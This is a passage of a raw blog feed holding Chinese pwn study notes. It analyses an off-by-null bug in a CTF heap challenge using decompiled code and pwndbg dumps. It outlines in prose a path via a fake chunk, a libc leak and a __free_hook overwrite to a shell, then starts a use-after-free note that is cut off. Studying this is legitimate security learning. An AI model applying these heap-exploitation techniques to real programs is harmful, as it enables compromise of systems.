class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_F55</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;unable to allocate enough space&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)readName(ptr, v1 - <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fail to read name&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book description size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Malformed size&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter book description: &quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)readName(v5, v1 - <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to read description&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 = sub_B24();</span><br><span class="line">        <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Library is full&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          <span class="keyword">if</span> ( v3 )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_DWORD *)v3 + <span class="number">6</span>) = v1;</span><br><span class="line">            *((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line">            *((_QWORD *)v3 + <span class="number">2</span>) = v5;</span><br><span class="line">            *((_QWORD *)v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">            *(_DWORD *)v3 = ++unk_202024;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Fail to allocate memory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    <span class="built_in">free</span>(v5);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">free</span>(v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​分析一波，有一些需要记住作用的阿变量名，比如 v1：</p><blockquote><ul><li><p>v1 可以很明显看出来，v1 是存放的是 book 的 name 的大小，ptr 就是 name 存放的地址：</p></li><li><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter book name size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">goto</span> LABEL_2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter book name (Max 32 chars): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>code￼<span class="token number">5</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li><li><p>之后开了个 v3，存放了 book 的所有信息：</p></li><li><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>off_202010 <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> ptr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> <span class="token operator">++</span>unk_202024<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>code￼<span class="token number">6</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li></ul></blockquote><p>​分配两次，代码类似这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;book1_name&quot;</span>,<span class="number">200</span>,<span class="string">&quot;book1_destruct&quot;</span>)</span><br><span class="line">add(<span class="number">0x21000</span>,<span class="string">&quot;book1_name&quot;</span>,<span class="number">0x21000</span>,<span class="string">&quot;book1_destruct&quot;</span>)</span><br></pre></td></tr></table></figure><p>​这个函数存在一些问题，a1 是我们想要写入的字符串的起始地址，a2 是判定边缘，但是，从 0 开始，一直到 a2 为止，很显然多进行了一次读入，因为这里的逻辑是先读入，再判断 i 与 a2 是否相等，所以这里就多循环了一次，造成了 offbyone，结束循环之后，又将后一位的内存修改成了 \x00，因此发生了溢出，例如一个数组是 32 字节，这个程序调用这个函数的时候，一直都是用的 size-1，所以传入的是 31，这个程序就刚好做到了让整个数组刚好可以写满，也就是写道 buf [31]，这里刚好写满，但是，有个关键的问题，最后一个还操作了一下，让 * a1=0，这也就导致了 buf [32]=0 的发生，溢出了一个字节，也就造成了 offbyone，或者说 off by null。</p><p>​上 gdb 看看，先输入 32 个 a 作为名字之后，那段内存变成了这样：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">search aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line">Searching for value: &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">pwn             0x555555602040 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555602040</span></span><br><span class="line">0x555555602040: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602050: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>​这里我想着直接通过 IDA 反编译的来确定这俩 BSS 段数据的地址的，结果 IDA 里莫名其妙的，有点怪怪的，这里就直接 GDB 调算偏移然后算真实地址之类的吧。首先，刚刚那里确定了作者 name 的那个地址为：0x555555602040，gdb 里调的时候查到 elf 的基地址为：0x555555400000（手动计算出来的），然后算出 bss 里作者 name 的偏移为：0x202040，加起来之后和 0x555555602040 这个地址一样，所以，可以断定，这个地址就是存放作者名字的地方，之后，经过两次申请内存之后，再看看 0x555555602040 地址的内存（根据结构体指针数组在 bss 段上，然后暴力经过两次 malloc 之后查询 bss 段内容有无变化发现了一些少量变化，由此定位结构体指针数组的地址）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555602040</span></span><br><span class="line">0x555555602040: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602050: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602060: 0x00005555556037a0      0x00005555556037d0</span><br><span class="line">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>​发现 0x555555602060 这个地址的内容变了，并且，还是某个书的结构体的数据域的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x00005555556037a0</span></span><br><span class="line">0x5555556037a0: 0x0000000000000001      0x00005555556036b0</span><br><span class="line">0x5555556037b0: 0x00005555556036d0      0x00000000000000c8</span><br><span class="line">0x5555556037c0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555556037d0: 0x0000000000000002      0x00007ffff7d66010</span><br><span class="line">0x5555556037e0: 0x00007ffff7d44010      0x0000000000021000</span><br><span class="line">0x5555556037f0: 0x0000000000000000      0x0000000000020811</span><br><span class="line">0x555555603800: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603810: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603820: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603830: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603840: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603850: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603860: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603870: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603880: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>​刚好整个程序存在一个修改作者名字的功能，可以修改作者名字，进行第二次 off by null，修改 0x00005555556036f0 为 0x0000555555603600：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555602040</span></span><br><span class="line">0x555555602040: 0x6262626262626262      0x6262626262626262</span><br><span class="line">0x555555602050: 0x6262626262626262      0x6262626262626262</span><br><span class="line">0x555555602060: 0x0000555555603700      0x00005555556037d0</span><br><span class="line">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>​那么，0x0000555555603600 这个地址指向的地方是哪里呢？用 heap 指令看看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555603000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555603290</span><br><span class="line">Size: 0x410 (with flag bits: 0x411)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556036a0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556036c0</span><br><span class="line">Size: 0xd0 (with flag bits: 0xd1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555603790</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556037c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555556037f0</span><br><span class="line">Size: 0x20810 (with flag bits: 0x20811)</span><br></pre></td></tr></table></figure><p>​发现这个地址是在 book1_desc 的中间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/50gx 0x5555556036c0</span></span><br><span class="line">0x5555556036c0: 0x0000000000000000      0x00000000000000d1</span><br><span class="line">0x5555556036d0: 0x65645f316b6f6f62      0x0000000000006373</span><br><span class="line">0x5555556036e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556036f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603700: 0x0000000000000000      0x0000000000000000&lt;-------------------</span><br><span class="line">0x555555603710: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603720: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603730: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603740: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603750: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603760: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603770: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603780: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603790: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555556037a0: 0x0000000000000001      0x00005555556036b0</span><br><span class="line">0x5555556037b0: 0x00005555556036d0      0x00000000000000c8</span><br><span class="line">0x5555556037c0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555556037d0: 0x0000000000000002      0x00007ffff7d66010</span><br><span class="line">0x5555556037e0: 0x00007ffff7d44010      0x0000000000021000</span><br><span class="line">0x5555556037f0: 0x0000000000000000      0x0000000000020811</span><br><span class="line">0x555555603800: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603810: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603820: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603830: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603840: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>​内存布局大概有了，这里借用某位大佬的图（hollk）：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5946f3207d5348e39aa969baf50b0db3.png#pic_center" alt="在这里插入图片描述"></p><p>​修改了 book1 的结构体指针地址之后，因为 book1_name 这里是可控的，所以可以在指向的那个地址伪造一个 fake_chunk，</p><p>​因为后面确实对我而言有点逆天，所以之后就简述了吧，之后就是伪造 chunk 泄露 libc 地址，然后继续伪造 fakechunk 修改 <code>__free_hook</code>  为 one_gadget，即可拿到 shell。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn学习笔记11off_by_one&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwn学习笔记11off_by_one&quot;&gt;#&lt;/a&gt; pwn 学习笔记（11）–off_by_one&lt;/h1&gt;
&lt;p&gt;​		在处理 for 循环或者 </summary>
      
    
    
    
    <category term="Pwn手的自我修养" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwn学习笔记（10）--UAF</title>
    <link href="http://blog.g01den.top/posts/540e5c20.html"/>
    <id>http://blog.g01den.top/posts/540e5c20.html</id>
    <published>2024-11-05T03:47:12.000Z</published>
    <updated>2024-11-05T03:51:20.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn学习笔记10uaf"><a class="markdownIt-Anchor" href="#pwn学习笔记10uaf">#</a> Pwn 学习笔记（10）–UAF：</h1><p>​UAF 就是 Use-After-Free，即一个指向堆块的指针被释放后指针没有置零，形成了悬空指针，使得堆可以再次被使用。</p><p>​由于我环境似乎运行不了某个程序，所以演示就不做了，上个简单题来看看。</p><p>​题目是一个标准的菜单题，有创建 note 和输出删除的功能，别的不看了，直接看那三个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;notelist + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;notelist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (<span class="type">int</span>)*(&amp;notelist + i);</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)*(&amp;notelist + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;notelist + i) + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span 